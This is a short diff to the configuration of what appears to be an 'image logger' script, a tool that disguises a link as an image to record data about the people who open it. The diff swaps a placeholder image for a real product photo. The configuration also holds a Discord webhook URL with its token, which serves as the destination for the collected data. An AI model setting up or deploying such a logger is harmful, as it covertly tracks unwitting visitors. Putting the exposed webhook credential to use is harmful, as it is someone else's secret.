@@ -10,7 +10,7 @@ __author__ = "Phytone"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1357818167409508362/Nv7J4QZgriF69R3pj9baRkXz88SW6RkUmdyxSAcQKcY8cL7RzazjD6dO1mZY4__OIxOG",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://www.420geeks.de/cdn/shop/files/a21b2920-8bb0-43ea-8831-de70a519ef2c_cbff528c-2e6b-40b7-9b22-27b560f7d062.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
